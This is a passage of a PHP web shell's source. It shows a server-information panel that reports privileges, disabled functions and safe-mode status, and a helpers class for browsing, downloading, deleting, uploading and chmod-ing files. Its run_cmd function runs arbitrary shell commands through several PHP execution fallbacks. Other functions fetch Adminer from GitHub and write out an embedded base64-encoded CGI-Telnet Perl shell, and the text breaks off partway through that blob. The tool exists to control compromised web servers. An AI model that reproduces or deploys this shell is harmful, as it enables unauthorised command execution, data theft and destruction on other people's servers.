                    <li class="toggle" onclick="adminer();"><i><img style="width:16px;height:16px;" src="data: image/x-icon;base64,AAABAAEAEBAQAAEABAAoAQAAFgAAACgAAAAQAAAAIAAAAAEABAAAAAAAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA////AAAA/wBhTgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAERERAAAAAAETMzEQAAAAATERExAAAAABMRETEAAAAAExERMQAAAAATERExAAAAABMRETEAAAAAEzMzMREREQATERExEhEhABEzMxEhEREAAREREhERIRAAAAARIRESEAAAAAESEiEQAAAAABEREQAAAAAAAAAAD//9UAwP/VAIB/AACAf/AAgH+kAIB/gACAfwAAgH8AAIABAACAAf8AgAH/AMAA/wD+AP8A/wAIAf+B1QD//9UA"></i><span>Adminer</span></li>
                </ul>
            </div>

            <div class="popup-box alert">
            </div>
            <div class="popup-box success">
            </div>

            <div class="title">

                <h3></h3>
                <ul>
                    <li><span></span> <?php print $_SERVER['SERVER_SOFTWARE'] . ' | PHP Version: ' . @phpversion(); ?></li>
                    <li><span></span> <?php print @php_uname() ? @php_uname() : 'Unable to get that information'; ?></li>
                    <li><span></span> uid=<?php print @getmyuid(); ?>(<?php print @get_current_user(); ?>) gid=<?php print @getmygid(); ?>(<?php $group = @posix_getgrgid(@getmygid());
                                                                                                                                            print $group['name'] ? $group['name'] : @get_current_user(); ?>)</li>
                    <li><span></span> <?php $user_count = $helpers->get_users_count();
                                        if ($user_count != 'Windows not supported') {
                                            print '<font class="toggle" style="cursor:pointer;text-decoration:underline;color:blue;font-weight:bold" onclick="user_list();">' . $user_count . '</font>';
                                        } else {
                                            print $user_count;
                                        } ?></li>
                    <li><span></span> <?php $group_count = $helpers->get_groups_count();
                                        if ($group_count != 'Windows not supported') {
                                            print '<font class="toggle" style="cursor:pointer;text-decoration:underline;color:blue;font-weight:bold" onclick="group_list();">' . $group_count . '</font>';
                                        } else {
                                            print $group_count;
                                        } ?></li>
                    <li><span></span> <?php if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") {
                                            print "<font style='color:red'>ON (secure)</font>";
                                        } else {
                                            print "<strong><font style='color:green'>OFF</font></strong>";
                                        } ?> </li>
                    <li><span></span> <?php $v = @ini_get("open_basedir");
                                        if ($v or strtolower($v) == "on") {
                                            print "<font style='color:red'>" . $v . "</font>";
                                        } else {
                                            print "<strong><font style='color:green'>OFF</font></strong>";
                                        } ?></li>
                    <li><span></span> <?php $df = @ini_get("disable_functions");
                                        if (!empty($df)) {
                                            print "<font style='color:red'>" . $df . "</font>";
                                        } else {
                                            print "<strong><font style='color:green'>NONE</font></strong>";
                                        } ?></li>
                    <li><span></span> <?php $s = @ini_get('upload_max_filesize');
                                        if (!empty($s)) {
                                            print $s;
                                        } else {
                                            print 'Unable to get that information';
                                        } ?></li>
                    <li><span></span>
                        <p><?php $ext = @get_loaded_extensions();
                            print implode(',', $ext); ?></p>
                    </li>
                    <li><span></span>
                        <p><?php $info = $helpers->get_ip_information(); ?> [ <strong>IP Address:</strong> <?php print $info["ip"]; ?> , <strong>Country:</strong> <?php print $info["country"]; ?> , <strong>City:</strong> <?php print $info["city"]; ?> , <strong>Region:</strong> <?php print $info["region"]; ?> , <strong>Timezone:</strong> <?php print $info["timezone"]; ?> ]</p>
                    </li>
                    <li style="margin-top:5px"><span></span>
                        <p>
                        <form method="post" style="display:flex;align-items:center" onsubmit="event.preventDefault();">
                            <div id="path"></div>
                        </form>
                        </p>
                    </li>
                    <li style="margin-top:5px"><span></span>
                        <p>
                        <form method="post" style="display:flex;align-items:center" onsubmit="event.preventDefault();"><input type="text" style="background:none;border:1px solid rgba(255,255,255,.3);width:600px;height:35px;padding-left:5px;" autocomplete="off" required id="curr_dir" value="" /><button onclick="change_dir();" style="margin-left:5px;text-align:center;height:35px;cursor:pointer;font-weight:bold;border:none;background:rgba(0,0,0,.2);color:#fff;padding:10px;width:150px;text-align:center">Change dir</button></form>
                        </p>
                    </li>
                    <li style="margin-top:5px"><span></span>
                        <p>
                        <form method="post" style="display:flex;align-items:center" onsubmit="event.preventDefault();"><input class="toggle" type="text" style="background:none;border:1px solid rgba(255,255,255,.3);width:600px;height:35px;padding-left:5px;" autocomplete="off" required id="read_file" value="" /><button class="toggle" onclick="readfile();" style="margin-left:5px;text-align:center;height:35px;cursor:pointer;font-weight:bold;border:none;background:rgba(0,0,0,.2);color:#fff;padding:10px;width:150px;text-align:center">Read File</button></form>
                        </p>
                    </li>

                </ul>
            </div>

            <div class="inner">
                <div class="loaderhold">
                    <div class="loader"></div>
                </div>
                <table cellspacing="0" cellpadding="0">
                    <thead>
                        <tr>
                            <th style="text-align:center;"></th>
                            <th style="text-align:left;">Name</th>
                            <th>Size</th>
                            <th>Last Modified</th>
                            <th>Permissions</th>
                            <th>Action</th>
                        </tr>
                    </thead>

                    <tbody>

                    </tbody>

                </table>
            </div>

            <div class="process-screen" id="screen"></div>

        </div>

    </div>


</body>

</html>


<?php

class helpers
{

    public function list_dir($target = '.')
    {
        if (!@chdir($target)) return false;
        $dirpath     = @getcwd();
        $current_dir = @scandir($target);
        unset($current_dir[0]);
        $dirs  = array();
        $files = array();
        $current_dir = @array_values($current_dir);

        foreach ($current_dir as $data) {
            if (is_dir($data)) {
                $dirs['name'][] = $data;
                $dirs['type'][] = $this->get_type($data);
                $dirs['perms'][] = $this->view_perms_color($data);
                $dirs['perm_num'][] = $this->view_perm_number($data);
                $dirs['size'][] = $this->get_size($data);
                $dirs['modify'][] = $this->modify_time($data);
            } else {
                $files['name'][] = $data;
                $files['type'][] = $this->get_type($data);
                $files['perms'][] = $this->view_perms_color($data);
                $files['perm_num'][] = $this->view_perm_number($data);
                $files['size'][] = $this->get_size($data);
                $files['modify'][] = $this->modify_time($data);
            }
        }
        $return_list = array();
        $count       = @count($dirs['name']);
        for ($i = 0; $i < $count; $i++) {
            $return_list['name'][]   = $dirs['name'][$i];
            $return_list['path'][]   = $dirpath . '/' . $dirs['name'][$i];
            $return_list['type'][]   = $dirs['type'][$i];
            $return_list['perms'][]  = $dirs['perms'][$i];
            $return_list['perm_num'][]      = $dirs['perm_num'][$i];
            $return_list['size'][]   = $dirs['size'][$i];
            $return_list['modify'][] = $dirs['modify'][$i];
        }
        $count2       = @count($files['name']);
        for ($x = 0; $x < $count2; $x++) {
            $return_list['name'][]   = $files['name'][$x];
            $return_list['path'][]   = $dirpath . '/' . $files['name'][$x];
            $return_list['type'][]   = $files['type'][$x];
            $return_list['perms'][]  = $files['perms'][$x];
            $return_list['perm_num'][] = $files['perm_num'][$x];
            $return_list['size'][]   = $files['size'][$x];
            $return_list['modify'][] = $files['modify'][$x];
        }
        $return_list['current_dir'][] = str_replace('\\', '/', @getcwd());

        return $return_list;
    }
    public function get_type($target)
    {
        if (is_dir($target)) {
            return 'directory';
        } else {
            return 'file';
        }
    }
    public function get_size($target)
    {
        if (is_file($target)) {
            return $this->human_filesize(@filesize($target));
        } else {
            return 'DIR';
        }
    }
    public function modify_time($target)
    {
        return date('d/m/Y - H:i:s', @filemtime($target));
    }
    public function human_filesize($bytes, $decimals = 2)
    {
        // https://gist.github.com/liunian/9338301
        $size = array('B', 'kB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB');
        $factor = floor((strlen($bytes) - 1) / 3);
        return sprintf("%.{$decimals}f", $bytes / pow(1024, $factor)) . @$size[$factor];
    }
    // view_perms & view_perms_color functions are taken from c99
    // Updated by: KaizenLouie for PHP 7
    // Find it on github
    public function view_perms($mode)
    {

        if (($mode & 0xC000) === 0xC000) {
            $type = "s";
        } elseif (($mode & 0x4000) === 0x4000) {
            $type = "d";
        } elseif (($mode & 0xA000) === 0xA000) {
            $type = "l";
        } elseif (($mode & 0x8000) === 0x8000) {
            $type = "-";
        } elseif (($mode & 0x6000) === 0x6000) {
            $type = "b";
        } elseif (($mode & 0x2000) === 0x2000) {
            $type = "c";
        } elseif (($mode & 0x1000) === 0x1000) {
            $type = "p";
        } else {
            $type = "?";
        }
        $owner["read"] = ($mode & 00400) ? "r" : "-";
        $owner["write"] = ($mode & 00200) ? "w" : "-";
        $owner["execute"] = ($mode & 00100) ? "x" : "-";
        $group["read"] = ($mode & 00040) ? "r" : "-";
        $group["write"] = ($mode & 00020) ? "w" : "-";
        $group["execute"] = ($mode & 00010) ? "x" : "-";
        $world["read"] = ($mode & 00004) ? "r" : "-";
        $world["write"] = ($mode & 00002) ? "w" : "-";
        $world["execute"] = ($mode & 00001) ? "x" : "-";
        if ($mode & 0x800) {
            $owner["execute"] = ($owner["execute"] == "x") ? "s" : "S";
        }
        if ($mode & 0x400) {
            $group["execute"] = ($group["execute"] == "x") ? "s" : "S";
        }
        if ($mode & 0x200) {
            $world["execute"] = ($world["execute"] == "x") ? "t" : "T";
        }
        return $type . join("", $owner) . join("", $group) . join("", $world);
    }
    public function view_perms_color($o)
    {
        if (!is_readable($o)) {
            return "<font style='color:red'>" . $this->view_perms(@fileperms($o)) . "</font>";
        } elseif (!is_writable($o)) {
            return "<font style='color:white'>" . $this->view_perms(@fileperms($o)) . "</font>";
        } else {
            return "<font style='color:green'>" . $this->view_perms(@fileperms($o)) . "</font>";
        }
    }
    public function view_perm_number($file)
    {
        return substr(sprintf("%o", @fileperms($file)), -4);
    }
    public function folderSize($dir)
    {
        $size = 0;
        $contents = glob(rtrim($dir, '/') . '/*', GLOB_NOSORT);

        foreach ($contents as $contents_value) {
            if (is_file($contents_value)) {
                $size += filesize($contents_value);
            } else {
                $size += $this->folderSize($contents_value);
            }
        }

        return $size;
    }
    public function download_file($file, $remove = false)
    {
        $pathinfo = pathinfo($file);

        header('Content-type: application/octet-stream');
        header("Content-Disposition: attachment; filename=" . $pathinfo['basename']);

        ob_end_clean();
        if (is_readable($file)) {
            readfile($file);
            if ($remove) @unlink($file);
            exit;
        } else {
            return false;
        }
    }
    public function remove_file($file)
    {
        if (is_dir($file)) {
            $rmdir = $this->delete_dir($file);
            if ($rmdir) {
                return true;
            } else {
                return false;
            }
        } else {
            if (@unlink($file)) {
                return true;
            } else {
                return false;
            }
        }
    }
    public function delete_dir($dir)
    {
        $files = array_diff(scandir($dir), array('.', '..'));
        foreach ($files as $file) (is_dir("$dir/$file")) ? $this->delete_dir("$dir/$file") : @unlink("$dir/$file");
        if (rmdir($dir)) {
            return true;
        } else {
            return false;
        }
    }

    public function set_chmod($target, $mode)
    {
        if (@chmod($target, octdec($mode))) {
            return true;
        } else {
            return false;
        }
    }
    public function rename($target, $name, $old_name)
    {
        $new_name = str_replace($old_name, $name, $target);
        if (@rename($target, $new_name)) {
            return true;
        } else {
            return false;
        }
    }
    public function file_upload($temp, $filename, $where)
    {
        if (function_exists('move_uploaded_file')) {
            if (@move_uploaded_file($temp, $where . '/' . $filename)) {
                return true;
            } else {
                return false;
            }
        } elseif (function_exists('copy')) {
            if (@copy($temp, $where . '/' . $filename)) {
                return true;
            } else {
                return false;
            }
        } else {
            return false;
        }
    }
    public function run_cmd($cmd, $dir = null)
    {
        if ($dir != null) @chdir($dir);
        if (function_exists("shell_exec")) {
            $run = shell_exec($cmd);
            return 'shell_exec|' . trim($run);
        } elseif (function_exists("exec")) {
            $run = exec($cmd, $result);
            return 'exec|' . implode("\r\n", array_map('trim', $result));
        } elseif (function_exists("popen")) {
            $run = popen($cmd, "r");
            $result = "";
            while (!feof($run)) {
                $buffer = fgets($run, 4096);
                $result .= "-> $buffer\r\n";
            }
            pclose($run);
            return 'popen|' . trim($result);
        } elseif (function_exists("passthru")) {
            passthru($cmd);
            $content    = ob_get_clean();
            return 'passthru|' . trim($content);
        } elseif (function_exists("system")) {
            system($cmd);
            $content    = ob_get_clean();
            return 'system|' . trim($content);
        } else {
            return false;
        }
    }
    public function getClientIP()
    {
        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            $ip = $_SERVER['HTTP_CLIENT_IP'];
        } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
        } else {
            $ip = $_SERVER['REMOTE_ADDR'];
        }
        return $ip;
    }

    public function get_adminer()
    {
        // https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1-en.php
        $name   = 'adminer-web.php';

        if (file_exists($name)) {
            return true;
        } else {
            $curl = curl_init();
            curl_setopt_array($curl, array(CURLOPT_RETURNTRANSFER => 1, CURLOPT_URL => 'https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1-en.php', CURLOPT_FOLLOWLOCATION => 1, CURLOPT_TIMEOUT => 20));
            $output = curl_exec($curl);
            curl_close($curl);

            if (@file_put_contents($name, $output)) {
                return true;
            } else {
                return false;
            }
        }
    }

    public function get_cgitelnet()
    {
        $name            = 'cgi_web.pl';
        $cgiTelnetCode = base64_decode('IyEvdXNyL2Jpbi9wZXJsCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBDb3B5cmlnaHQgYW5kIExpY2VuY2UKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIENHSS1UZWxuZXQgVmVyc2lvbiAxLjAgZm9yIE5UIGFuZCBVbml4IDogUnVuIENvbW1hbmRzIG9uIHlvdXIgV2ViIFNlcnZlcgojCiMgQ29weXJpZ2h0IChDKSAyMDAxIFJvaGl0YWIgQmF0cmEKIyBQZXJtaXNzaW9uIGlzIGdyYW50ZWQgdG8gdXNlLCBkaXN0cmlidXRlIGFuZCBtb2RpZnkgdGhpcyBzY3JpcHQgc28gbG9uZwojIGFzIHRoaXMgY29weXJpZ2h0IG5vdGljZSBpcyBsZWZ0IGludGFjdC4gSWYgeW91IG1ha2UgY2hhbmdlcyB0byB0aGUgc2NyaXB0CiMgcGxlYXNlIGRvY3VtZW50IHRoZW0gYW5kIGluZm9ybSBtZS4gSWYgeW91IHdvdWxkIGxpa2UgYW55IGNoYW5nZXMgdG8gYmUgbWFkZQojIGluIHRoaXMgc2NyaXB0LCB5b3UgY2FuIGUtbWFpbCBtZS4KIwojIEF1dGhvcjogUm9oaXRhYiBCYXRyYQojIEF1dGhvciBlLW1haWw6IHJvaGl0YWJAcm9oaXRhYi5jb20KIyBBdXRob3IgSG9tZXBhZ2U6IGh0dHA6Ly93d3cucm9oaXRhYi5jb20vCiMgU2NyaXB0IEhvbWVwYWdlOiBodHRwOi8vd3d3LnJvaGl0YWIuY29tL2NnaXNjcmlwdHMvY2dpdGVsbmV0Lmh0bWwKIyBQcm9kdWN0IFN1cHBvcnQ6IGh0dHA6Ly93d3cucm9oaXRhYi5jb20vc3VwcG9ydC8KIyBEaXNjdXNzaW9uIEZvcnVtOiBodHRwOi8vd3d3LnJvaGl0YWIuY29tL2Rpc2N1c3MvCiMgTWFpbGluZyBMaXN0OiBodHRwOi8vd3d3LnJvaGl0YWIuY29tL21saXN0LwojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgSW5zdGFsbGF0aW9uCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBUbyBpbnN0YWxsIHRoaXMgc2NyaXB0CiMKIyAxLiBNb2RpZnkgdGhlIGZpcnN0IGxpbmUgIiMhL3Vzci9iaW4vcGVybCIgdG8gcG9pbnQgdG8gdGhlIGNvcnJlY3QgcGF0aCBvbgojICAgIHlvdXIgc2VydmVyLiBGb3IgbW9zdCBzZXJ2ZXJzLCB5b3UgbWF5IG5vdCBuZWVkIHRvIG1vZGlmeSB0aGlzLgojIDIuIENoYW5nZSB0aGUgcGFzc3dvcmQgaW4gdGhlIENvbmZpZ3VyYXRpb24gc2VjdGlvbiBiZWxvdy4KIyAzLiBJZiB5b3UncmUgcnVubmluZyB0aGUgc2NyaXB0IHVuZGVyIFdpbmRvd3MgTlQsIHNldCAkV2luTlQgPSAxIGluIHRoZQojICAgIENvbmZpZ3VyYXRpb24gU2VjdGlvbiBiZWxvdy4KIyA0LiBVcGxvYWQgdGhlIHNjcmlwdCB0byBhIGRpcmVjdG9yeSBvbiB5b3VyIHNlcnZlciB3aGljaCBoYXMgcGVybWlzc2lvbnMgdG8KIyAgICBleGVjdXRlIENHSSBzY3JpcHRzLiBUaGlzIGlzIHVzdWFsbHkgY2dpLWJpbi4gTWFrZSBzdXJlIHRoYXQgeW91IHVwbG9hZAojICAgIHRoZSBzY3JpcHQgaW4gQVNDSUkgbW9kZS4KIyA1LiBDaGFuZ2UgdGhlIHBlcm1pc3Npb24gKENITU9EKSBvZiB0aGUgc2NyaXB0IHRvIDc1NS4KIyA2LiBPcGVuIHRoZSBzY3JpcHQgaW4geW91ciB3ZWIgYnJvd3Nlci4gSWYgeW91IHVwbG9hZGVkIHRoZSBzY3JpcHQgaW4KIyAgICBjZ2ktYmluLCB0aGlzIHNob3VsZCBiZSBodHRwOi8vd3d3LnlvdXJzZXJ2ZXIuY29tL2NnaS1iaW4vY2dpdGVsbmV0LnBsCiMgNy4gTG9naW4gdXNpbmcgdGhlIHBhc3N3b3JkIHRoYXQgeW91IHNwZWNpZmllZCBpbiBTdGVwIDIuCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KIyBDb25maWd1cmF0aW9uOiBZb3UgbmVlZCB0byBjaGFuZ2Ugb25seSAkUGFzc3dvcmQgYW5kICRXaW5OVC4gVGhlIG90aGVyCiMgdmFsdWVzIHNob3VsZCB3b3JrIGZpbmUgZm9yIG1vc3Qgc3lzdGVtcy4KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQokUGFzc3dvcmQgPSAibXdzIjsJCSMgQ2hhbmdlIHRoaXMuIFlvdSB3aWxsIG5lZWQgdG8gZW50ZXIgdGhpcwoJCQkJIyB0byBsb2dpbi4KCiRXaW5OVCA9IDA7CQkJIyBZb3UgbmVlZCB0byBjaGFuZ2UgdGhlIHZhbHVlIG9mIHRoaXMgdG8gMSBpZgoJCQkJIyB5b3UncmUgcnVubmluZyB0aGlzIHNjcmlwdCBvbiBhIFdpbmRvd3MgTlQKCQkJCSMgbWFjaGluZS4gSWYgeW91J3JlIHJ1bm5pbmcgaXQgb24gVW5peCwgeW91CgkJCQkjIGNhbiBsZWF2ZSB0aGUgdmFsdWUgYXMgaXQgaXMuCgokTlRDbWRTZXAgPSAiJiI7CQkjIFRoaXMgY2hhcmFjdGVyIGlzIHVzZWQgdG8gc2VwZXJhdGUgMiBjb21tYW5kcwoJCQkJIyBpbiBhIGNvbW1hbmQgbGluZSBvbiBXaW5kb3dzIE5ULgoKJFVuaXhDbWRTZXAgPSAiOyI7CQkjIFRoaXMgY2hhcmFjdGVyIGlzIHVzZWQgdG8gc2VwZXJhdGUgMiBjb21tYW5kcwoJCQkJIyBpbiBhIGNvbW1hbmQgbGluZSBvbiBVbml4LgoKJENvbW1hbmRUaW1lb3V0RHVyYXRpb24gPSAxMDsJIyBUaW1lIGluIHNlY29uZHMgYWZ0ZXIgY29tbWFuZHMgd2lsbCBiZSBraWxsZWQKCQkJCSMgRG9uJ3Qgc2V0IHRoaXMgdG8gYSB2ZXJ5IGxhcmdlIHZhbHVlLiBUaGlzIGlzCgkJCQkjIHVzZWZ1bCBmb3IgY29tbWFuZHMgdGhhdCBtYXkgaGFuZyBvciB0aGF0CgkJCQkjIHRha2UgdmVyeSBsb25nIHRvIGV4ZWN1dGUsIGxpa2UgImZpbmQgLyIuCgkJCQkjIFRoaXMgaXMgdmFsaWQgb25seSBvbiBVbml4IHNlcnZlcnMuIEl0IGlzCgkJCQkjIGlnbm9yZWQgb24gTlQgU2VydmVycy4KCiRTaG93RHluYW1pY091dHB1dCA9IDE7CQkjIElmIHRoaXMgaXMgMSwgdGhlbiBkYXRhIGlzIHNlbnQgdG8gdGhlCgkJCQkjIGJyb3dzZXIgYXMgc29vbiBhcyBpdCBpcyBvdXRwdXQsIG90aGVyd2lzZQoJCQkJIyBpdCBpcyBidWZmZXJlZCBhbmQgc2VuZCB3aGVuIHRoZSBjb21tYW5kCgkJCQkjIGNvbXBsZXRlcy4gVGhpcyBpcyB1c2VmdWwgZm9yIGNvbW1hbmRzIGxpa2UKCQkJCSMgcGluZywgc28gdGhhdCB5b3UgY2FuIHNlZSB0aGUgb3V0cHV0IGFzIGl0CgkJCQkjIGlzIGJlaW5nIGdlbmVyYXRlZC4KCiMgRE9OJ1QgQ0hBTkdFIEFOWVRISU5HIEJFTE9XIFRISVMgTElORSBVTkxFU1MgWU9VIEtOT1cgV0hBVCBZT1UnUkUgRE9JTkcgISEKCiRDbWRTZXAgPSAoJFdpbk5UID8gJE5UQ21kU2VwIDogJFVuaXhDbWRTZXApOwokQ21kUHdkID0gKCRXaW5OVCA/ICJjZCIgOiAicHdkIik7CiRQYXRoU2VwID0gKCRXaW5OVCA/ICJcXCIgOiAiLyIpOwokUmVkaXJlY3RvciA9ICgkV2luTlQgPyAiIDI+JjEgMT4mMiIgOiAiIDE+JjEgMj4mMSIpOwoKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFJlYWRzIHRoZSBpbnB1dCBzZW50IGJ5IHRoZSBicm93c2VyIGFuZCBwYXJzZXMgdGhlIGlucHV0IHZhcmlhYmxlcy4gSXQKIyBwYXJzZXMgR0VULCBQT1NUIGFuZCBtdWx0aXBhcnQvZm9ybS1kYXRhIHRoYXQgaXMgdXNlZCBmb3IgdXBsb2FkaW5nIGZpbGVzLgojIFRoZSBmaWxlbmFtZSBpcyBzdG9yZWQgaW4gJGlueydmJ30gYW5kIHRoZSBkYXRhIGlzIHN0b3JlZCBpbiAkaW57J2ZpbGVkYXRhJ30uCiMgT3RoZXIgdmFyaWFibGVzIGNhbiBiZSBhY2Nlc3NlZCB1c2luZyAkaW57J3Zhcid9LCB3aGVyZSB2YXIgaXMgdGhlIG5hbWUgb2YKIyB0aGUgdmFyaWFibGUuIE5vdGU6IE1vc3Qgb2YgdGhlIGNvZGUgaW4gdGhpcyBmdW5jdGlvbiBpcyB0YWtlbiBmcm9tIG90aGVyIENHSQojIHNjcmlwdHMuCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFJlYWRQYXJzZSAKewoJbG9jYWwgKCppbikgPSBAXyBpZiBAXzsKCWxvY2FsICgkaSwgJGxvYywgJGtleSwgJHZhbCk7CgkKCSRNdWx0aXBhcnRGb3JtRGF0YSA9ICRFTlZ7J0NPTlRFTlRfVFlQRSd9ID1+IC9tdWx0aXBhcnRcL2Zvcm0tZGF0YTsgYm91bmRhcnk9KC4rKSQvOwoKCWlmKCRFTlZ7J1JFUVVFU1RfTUVUSE9EJ30gZXEgIkdFVCIpCgl7CgkJJGluID0gJEVOVnsnUVVFUllfU1RSSU5HJ307Cgl9CgllbHNpZigkRU5WeydSRVFVRVNUX01FVEhPRCd9IGVxICJQT1NUIikKCXsKCQliaW5tb2RlKFNURElOKSBpZiAkTXVsdGlwYXJ0Rm9ybURhdGEgJiAkV2luTlQ7CgkJcmVhZChTVERJTiwgJGluLCAkRU5WeydDT05URU5UX0xFTkdUSCd9KTsKCX0KCgkjIGhhbmRsZSBmaWxlIHVwbG9hZCBkYXRhCglpZigkRU5WeydDT05URU5UX1RZUEUnfSA9fiAvbXVsdGlwYXJ0XC9mb3JtLWRhdGE7IGJvdW5kYXJ5PSguKykkLykKCXsKCQkkQm91bmRhcnkgPSAnLS0nLiQxOyAjIHBsZWFzZSByZWZlciB0byBSRkMxODY3IAoJCUBsaXN0ID0gc3BsaXQoLyRCb3VuZGFyeS8sICRpbik7IAoJCSRIZWFkZXJCb2R5ID0gJGxpc3RbMV07CgkJJEhlYWRlckJvZHkgPX4gL1xyXG5cclxufFxuXG4vOwoJCSRIZWFkZXIgPSAkYDsKCQkkQm9keSA9ICQnOwogCQkkQm9keSA9fiBzL1xyXG4kLy87ICMgdGhlIGxhc3QgXHJcbiB3YXMgcHV0IGluIGJ5IE5ldHNjYXBlCgkJJGlueydmaWxlZGF0YSd9ID0gJEJvZHk7CgkJJEhlYWRlciA9fiAvZmlsZW5hbWU9XCIoLispXCIvOyAKCQkkaW57J2YnfSA9ICQxOyAKCQkkaW57J2YnfSA9fiBzL1wiLy9nOwoJCSRpbnsnZid9ID1+IHMvXHMvL2c7CgoJCSMgcGFyc2UgdHJhaWxlcgoJCWZvcigkaT0yOyAkbGlzdFskaV07ICRpKyspCgkJeyAKCQkJJGxpc3RbJGldID1+IHMvXi4rbmFtZT0kLy87CgkJCSRsaXN0WyRpXSA9fiAvXCIoXHcrKVwiLzsKCQkJJGtleSA9ICQxOwoJCQkkdmFsID0gJCc7CgkJCSR2YWwgPX4gcy8oXihcclxuXHJcbnxcblxuKSl8KFxyXG4kfFxuJCkvL2c7CgkJCSR2YWwgPX4gcy8lKC4uKS9wYWNrKCJjIiwgaGV4KCQxKSkvZ2U7CgkJCSRpbnska2V5fSA9ICR2YWw7IAoJCX0KCX0KCWVsc2UgIyBzdGFuZGFyZCBwb3N0IGRhdGEgKHVybCBlbmNvZGVkLCBub3QgbXVsdGlwYXJ0KQoJewoJCUBpbiA9IHNwbGl0KC8mLywgJGluKTsKCQlmb3JlYWNoICRpICgwIC4uICQjaW4pCgkJewoJCQkkaW5bJGldID1+IHMvXCsvIC9nOwoJCQkoJGtleSwgJHZhbCkgPSBzcGxpdCgvPS8sICRpblskaV0sIDIpOwoJCQkka2V5ID1+IHMvJSguLikvcGFjaygiYyIsIGhleCgkMSkpL2dlOwoJCQkkdmFsID1+IHMvJSguLikvcGFjaygiYyIsIGhleCgkMSkpL2dlOwoJCQkkaW57JGtleX0gLj0gIlwwIiBpZiAoZGVmaW5lZCgkaW57JGtleX0pKTsKCQkJJGlueyRrZXl9IC49ICR2YWw7CgkJfQoJfQp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgUHJpbnRzIHRoZSBIVE1MIFBhZ2UgSGVhZGVyCiMgQXJndW1lbnQgMTogRm9ybSBpdGVtIG5hbWUgdG8gd2hpY2ggZm9jdXMgc2hvdWxkIGJlIHNldAojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQcmludFBhZ2VIZWFkZXIKewoJJEVuY29kZWRDdXJyZW50RGlyID0gJEN1cnJlbnREaXI7CgkkRW5jb2RlZEN1cnJlbnREaXIgPX4gcy8oW15hLXpBLVowLTldKS8nJScudW5wYWNrKCJIKiIsJDEpL2VnOwoJcHJpbnQgIkNvbnRlbnQtdHlwZTogdGV4dC9odG1sXG5cbiI7CglwcmludCA8PEVORDsKPCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvc3RyaWN0LmR0ZCI+CjxodG1sPgo8aGVhZD4KPHRpdGxlPkNHSS1UZWxuZXQgVmVyc2lvbiAxLjA8L3RpdGxlPgokSHRtbE1ldGFIZWFkZXIKPC9oZWFkPgo8Ym9keSBvbkxvYWQ9ImRvY3VtZW50LmYuQF8uZm9jdXMoKSIgYmdjb2xvcj0iIzAwMDAwMCIgdG9wbWFyZ2luPSIwIiBsZWZ0bWFyZ2luPSIwIiBtYXJnaW53aWR0aD0iMCIgbWFyZ2luaGVpZ2h0PSIwIj4KPHRhYmxlIGJvcmRlcj0iMSIgd2lkdGg9IjEwMCUiIGNlbGxzcGFjaW5nPSIwIiBjZWxscGFkZGluZz0iMiI+Cjx0cj4KPHRkIGJnY29sb3I9IiNDMkJGQTUiIGJvcmRlcmNvbG9yPSIjMDAwMDgwIiBhbGlnbj0iY2VudGVyIj4KPGI+PGZvbnQgY29sb3I9IiMwMDAwODAiIHNpemU9IjIiPiM8L2ZvbnQ+PC9iPjwvdGQ+Cjx0ZCBiZ2NvbG9yPSIjMDAwMDgwIj48Zm9udCBmYWNlPSJWZXJkYW5hIiBzaX